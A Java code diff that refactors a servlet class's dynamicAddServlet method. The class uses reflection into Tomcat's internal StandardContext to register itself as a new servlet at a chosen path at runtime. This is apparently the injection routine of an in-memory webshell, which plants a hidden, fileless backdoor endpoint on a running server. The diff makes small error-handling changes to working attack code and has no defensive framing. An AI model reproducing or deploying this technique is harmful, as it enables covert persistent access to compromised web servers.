@@ -204,47 +204,40 @@ public class BehOldDemoServlet extends ClassLoader implements Servlet {
         super(classLoader);
     }
 
-    public void dynamicAddServlet(ServletContext servletContext) {
-        try {
-            String wrapperName = this.path;
+    public void dynamicAddServlet(ServletContext servletContext) throws Exception {
+        String wrapperName = this.path;
 
+        // get standardContext
+        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
+        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
+        applicationContextField.setAccessible(true);
 
-            // get standardContext
-            ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
-            Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
-            applicationContextField.setAccessible(true);
+        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
+        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+        standardContextField.setAccessible(true);
+        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
 
-            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
-            Field standardContextField = applicationContext.getClass().getDeclaredField("context");
-            standardContextField.setAccessible(true);
-            StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
-
-            Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);
-            this.invoke(newWrapper, "setName", wrapperName);
-            setFieldValue(newWrapper, "instance", this);
-            Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
-            Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
-            if (oldWrapper != null) {
-                standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
-            }
-
-            standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
-
-            Method method;
-            try {
-                method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
-            } catch (Exception var9) {
-                method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
-            }
-
-            method.invoke(standardContext, path, wrapperName);
-//            if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
-//                this.transform(standardContext, path);
-            this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
-//            }
-        } catch (Exception e) {
-            ;
+        Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[]) null);
+        this.invoke(newWrapper, "setName", wrapperName);
+        setFieldValue(newWrapper, "instance", this);
+        Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
+        Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
+        if (oldWrapper != null) {
+            standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
         }
+
+        standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
+
+        Method method;
+        try {
+            method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
+        } catch (Exception var9) {
+            method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
+        }
+
+        method.invoke(standardContext, path, wrapperName);
+
+        this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
     }
 
     private void transform(Object standardContext, String path) throws Exception {
